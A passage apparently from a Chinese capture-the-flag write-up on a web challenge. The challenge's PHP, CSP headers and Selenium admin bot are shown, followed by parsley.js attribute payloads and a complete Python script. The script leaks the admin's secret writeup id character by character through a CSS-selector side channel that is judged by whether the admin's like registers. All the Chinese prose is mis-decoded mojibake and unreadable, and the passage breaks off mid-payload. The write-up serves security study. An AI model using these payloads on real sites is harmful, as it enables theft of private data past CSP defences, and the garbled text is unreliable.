</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° id å¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ writeup id æ¥è·å– writeup å†…å®¹ï¼Œè€Œ flag writeup id åœ¨ admin ç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨ header.php ä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„ writeup id</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>foreach</span><span class=p>(</span><span class=nv>$writeups</span> <span class=k>as</span> <span class=nv>$w</span><span class=p>)</span><span class=o>:</span> <span class=cp>?&gt;</span><span class=err>
</span><span class=err>  &lt;li&gt;&lt;a href=&#34;/show.php?id=&lt;?= $w[&#39;id&#39;] ?&gt;&#34;&gt;Writeup - &lt;?= $w[&#39;id&#39;] ?&gt;&lt;/a&gt;&lt;/li&gt;
</span><span class=err>&lt;?php endforeach; ?&gt;
</span></code></pre></div><p>æ—¢ç„¶æœ‰æäº¤ä»£ç ç»™ admin çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æœ‰å¯èƒ½æ˜¯ä¸€ä¸ª xss æˆ–è€…ä»€ä¹ˆçš„ï¼Ÿ</p>
<p>æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ° admin å†æ”¶åˆ° writeup åçš„ä¸»è¦æ“ä½œï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>display</span> <span class=o>=</span> <span class=n>Display</span><span class=p>(</span><span class=n>visible</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=p>(</span><span class=mi>800</span><span class=p>,</span> <span class=mi>600</span><span class=p>))</span>
<span class=n>display</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
<span class=n>chrome_options</span> <span class=o>=</span> <span class=n>Options</span><span class=p>()</span>
<span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--disable-gpu&#39;</span><span class=p>)</span>
<span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--headless&#39;</span><span class=p>)</span>
<span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--no-sandbox&#39;</span><span class=p>)</span>
<span class=n>driver</span> <span class=o>=</span> <span class=n>webdriver</span><span class=o>.</span><span class=n>Chrome</span><span class=p>(</span><span class=s1>&#39;/usr/bin/chromedriver&#39;</span><span class=p>,</span> <span class=n>options</span><span class=o>=</span><span class=n>chrome_options</span><span class=p>)</span>

<span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=&#39;</span><span class=o>+</span><span class=n>writeup_id</span>
<span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
<span class=n>element</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element_by_xpath</span><span class=p>(</span><span class=s1>&#39;//input[@id=&#34;like&#34;]&#39;</span><span class=p>)</span>
<span class=n>element</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>

<span class=n>driver</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
<span class=n>display</span><span class=o>.</span><span class=n>stop</span><span class=p>()</span>
</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° admin åœ¨è¿›è¡Œç™»å½•ä¹‹åä½¿ç”¨<code>find_element_by_xpath</code>æ‰¾åˆ°äº† id ä¸º like çš„ input æ ‡ç­¾ï¼Œå¹¶è¿›è¡Œäº†ç‚¹å‡»ï¼Œä¹Ÿå°±æ˜¯æäº¤ç»™ admin çš„ writeup åï¼Œadmin ä¼šæµè§ˆè¿›è¡Œç‚¹å‡»ï¼Œå‘é€ä¸€ä¸ªç‚¹èµè¯·æ±‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/like.php&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;c&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;?= $_SESSION[&#39;c&#39;] ?&gt;&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;id&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;?= $writeup[&#39;id&#39;] ?&gt;&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;like&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;ğŸ‘&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</code></pre></div><p>æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ general.php ä¸­çš„é˜²å¾¡æªæ–½</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>session_start</span><span class=p>([</span><span class=s1>&#39;cookie_httponly&#39;</span> <span class=o>=&gt;</span> <span class=k>true</span><span class=p>,</span> <span class=s1>&#39;cookie_samesite&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Strict&#39;</span><span class=p>]);</span>
<span class=c1>//...
</span><span class=c1></span><span class=k>function</span> <span class=nf>id</span><span class=p>()</span> <span class=p>{</span>
    <span class=k>return</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
<span class=p>}</span>

<span class=nv>$nonce</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>id</span><span class=p>());</span>
<span class=c1>//...
</span><span class=c1></span><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;x-xss-protection: 1; mode=block&#39;</span><span class=p>);</span>
<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Content-Type-Options: nosniff&#39;</span><span class=p>);</span>
<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;x-frame-options: DENY&#39;</span><span class=p>);</span>
<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Referrer-Policy: no-referrer&#39;</span><span class=p>);</span>
<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Feature-Policy: geolocation &#39;none&#39;; midi &#39;none&#39;; sync-xhr &#39;none&#39;; microphone &#39;none&#39;; camera &#39;none&#39;; magnetometer &#39;none&#39;; gyroscope &#39;none&#39;; speaker &#39;none&#39;; fullscreen &#39;none&#39;; payment &#39;none&#39;; usb &#39;none&#39;; vr &#39;none&#39;; encrypted-media &#39;none&#39;&#34;</span><span class=p>);</span>
<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-&#34;</span><span class=o>.</span><span class=nv>$nonce</span><span class=o>.</span><span class=s2>&#34;&#39; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri &#39;self&#39;; form-action &#39;self&#39;; frame-ancestors &#39;none&#39;; require-sri-for script style;&#34;</span><span class=p>);</span>
</code></pre></div><p>è€Œ<code>script-src</code>è®¾ç½®çš„ nonce åªåœ¨ header.php ä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ª nonce</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>nonce</span><span class=o>=</span><span class=s2>&#34;&lt;?=</span><span class=si>$nonce</span><span class=s2>?&gt;&#34;</span><span class=o>&gt;</span>
    <span class=err>$</span><span class=p>(</span><span class=s1>&#39;#publish-form&#39;</span><span class=p>)</span><span class=o>.</span><span class=nx>parsley</span><span class=p>()</span> <span class=c1>// prevent hacking
</span><span class=c1></span><span class=o>&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>
</code></pre></div><p>æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª js æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª jquery.js ï¼Œå¦ä¸€ä¸ª parsley.jsã€‚</p>
<h3 id=parsleyjs>Parsley.js</h3>
<p>æˆ‘ä»¬å¯ä»¥å» <a class=link href=https://parsleyjs.org/doc/index.html target=_blank rel=noopener>parsley.js doc</a> çœ‹åˆ°è¯¥ lib çš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š</p>
<blockquote>
<p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p>
<p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p>
<p>That&rsquo;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p>
</blockquote>
<p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„ APIï¼š</p>
<blockquote>
<p><strong>data-parsley-trigger=&ldquo;input&rdquo;</strong></p>
<p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=&ldquo;focusin focusout&rdquo;. Default is null. See the various events supported by jQuery.</p>
<p><strong>data-parsley-error-message=&ldquo;my message&rdquo;</strong></p>
<p>Customize a unique global message for the field.</p>
<p><strong>data-parsley-errors-container="#element"</strong></p>
<p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p>
</blockquote>
<p>æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>data-parsley-trigger</code>è®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨<code>data-parsley-error-message</code>æ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨<code>data-parsley-errors-container</code>æ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚</p>
<p>æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ª<code>data-parsley-validate</code>æŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> 
            <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;blur&#34;</span> <span class=na>autofocus</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;some-field&#34;</span>
            <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#34;&lt;input id=like type=button value=padyload&gt;&#34;</span> 
            <span class=na>data-parsley-required</span>
            <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;#div1&#34;</span><span class=p>/&gt;</span>
<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</code></pre></div><p><code>data-parsley-trigger</code>æŒ‡å®šäº†<code>blur</code>äº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„ input å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨ id ä¸º div1 çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png loading=lazy>
</a>
</figure></p>
<p>###Click</p>
<p>å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡ show.php æ‰“å¼€ä½ çš„ writeup å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š id ä¸º like çš„ input æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡ <code>selenium.webdriver</code>è°ƒç”¨<code>find_element_by_xpath</code>å‡½æ•°å¾—åˆ°çš„ id ä¸º like çš„ input å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨ writeup å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œadmin ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ input ã€‚</p>
<p>å¹¶ä¸” CSP ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š parsley.js çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº› Payload ã€‚</p>
<p>é¦–å…ˆï¼Œå› ä¸º<code>find_element_by_xpath</code>åªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡ parsley.js å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„ id ä¸º like çš„ input æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚</p>
<p>ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹ admin è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png loading=lazy>
</a>
</figure></p>
<p>é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯ header.php ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„ writeup ï¼Œä¹Ÿå°±æ˜¯è¯´ admin çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª a æ ‡ç­¾å°±æ˜¯ flag çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å– writeup id çš„äº‹æƒ…äº†ã€‚</p>
<h3 id=css-selector>CSS Selector</h3>
<p>å¦‚ä½•è·å– a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„<code>data-parsley-errors-container</code> API æœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª API åˆæ”¯æŒ CSS é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ CSS é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª a æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚</p>
<p>ç±»ä¼¼ä¹‹å‰ XCTF Final ä¸€ä¸ª CSS ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨<code>a[href^='/show.php?id={flag}]</code>çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„ id=like input æ ‡ç­¾æ’å…¥åˆ°è¯¥ a æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤ like è¯·æ±‚çš„ input æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley.js ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„ writeup é¡µé¢çœ‹åˆ° admin çš„ç‚¹èµã€‚</p>
<p>æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å– flag çš„ writeup idã€‚</p>
<p>è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>import</span> <span class=nn>time</span>

<span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>

<span class=n>base_url</span> <span class=o>=</span> <span class=s2>&#34;http://ip:8001/&#34;</span>

<span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>base_url</span><span class=p>)</span>

<span class=n>pos</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;name=&#34;c&#34; value=&#34;&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;name=&#34;c&#34; value=&#34;&#39;</span><span class=p>)</span>
<span class=n>csrftoken</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>[</span><span class=n>pos</span><span class=p>:</span><span class=n>pos</span><span class=o>+</span><span class=mi>16</span><span class=p>]</span>

<span class=n>ss</span> <span class=o>=</span> <span class=s2>&#34;1234567890abcdef&#34;</span>
<span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>ss</span><span class=p>:</span>
        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=</span><span class=se>\&#34;</span><span class=s2>blur</span><span class=se>\&#34;</span><span class=s2> data-parsley-error-message=&#39;&lt;input type=</span><span class=se>\&#34;</span><span class=s2>input</span><span class=se>\&#34;</span><span class=s2> id=like value=</span><span class=se>\&#34;</span><span class=s2>rebirth_is_really_nb</span><span class=se>\&#34;</span><span class=s2>&gt;&#39; data-parsley-errors-container=</span><span class=se>\&#34;</span><span class=s2>a[href^=&#39;/show.php?id=</span><span class=si>{</span><span class=n>flag</span> <span class=o>+</span> <span class=n>j</span><span class=si>}</span><span class=s2>&#39;]</span><span class=se>\&#34;</span><span class=s2> autofocus&gt;&lt;/form&gt;&#34;</span>
        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=n>csrftoken</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;add.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
        <span class=c1># print(res.headers)</span>
        <span class=n>location</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Location&#39;</span><span class=p>]</span>
        <span class=n>pos</span> <span class=o>=</span> <span class=n>location</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;id=&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>3</span>
        <span class=n>wp</span> <span class=o>=</span> <span class=n>location</span><span class=p>[</span><span class=n>pos</span><span class=p>:]</span>
        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=n>csrftoken</span><span class=p>,</span> <span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=n>wp</span><span class=p>}</span>
        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;admin.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>

        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;http://ip:8001/show.php?id=</span><span class=si>{</span><span class=n>wp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
        <span class=c1># print(res.text)</span>
        <span class=n>txt</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
        <span class=k>if</span> <span class=s2>&#34;Liked by&lt;/h3&gt;admin&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>txt</span><span class=p>:</span>
            <span class=n>flag</span> <span class=o>+=</span> <span class=n>j</span>
            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>flag</span><span class=p>)</span>
            <span class=k>break</span>
</code></pre></div><p>æ‹¿åˆ° writeup id ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png loading=lazy>
</a>
</figure></p>
<h3 id=other-selector>Other Selector</h3>
<p>å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨ a æ ‡ç­¾çš„ href å±æ€§è¿›è¡Œè·å– writeup idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ value å€¼ï¼Œä¾‹å¦‚ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span>
         <span class=na>id</span><span class=o>=</span><span class=s>&#34;like&#34;</span>
         <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;blur&#34;</span> <span class=na>autofocus</span>
         <span class=na>name</span><span class=o>=</span><span class=s>&#34;some-field&#34;</span> 
         <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#34;&lt;input id=like type=button&gt;&#34;</span> <span class=na>data-parsley-required</span>
         <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;a:contains(&#39;Writeup - 5&#39;):eq(0)&#34;</span> <span class=p>/&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</code></pre></div><p>æˆ–è€…ä½¿ç”¨<code>data-parsley-equalto</code> API è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š</p>
<blockquote>
<p><strong>data-parsley-equalto="#anotherfield"</strong></p>
<p>Validates that the value is identical to another field&rsquo;s value (useful for password confirmation check).</p>
</blockquote>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> 
        <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;focusout&#34;</span>
        <span class=na>data-parsley-equalto</span><span class=o>=</span><span class=s>&#39;a[href^=&#34;/show.php?id=GUESS&#34;]&#39;</span>
        <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;form[action=&#39;/like.php&#39;]&#34;</span>
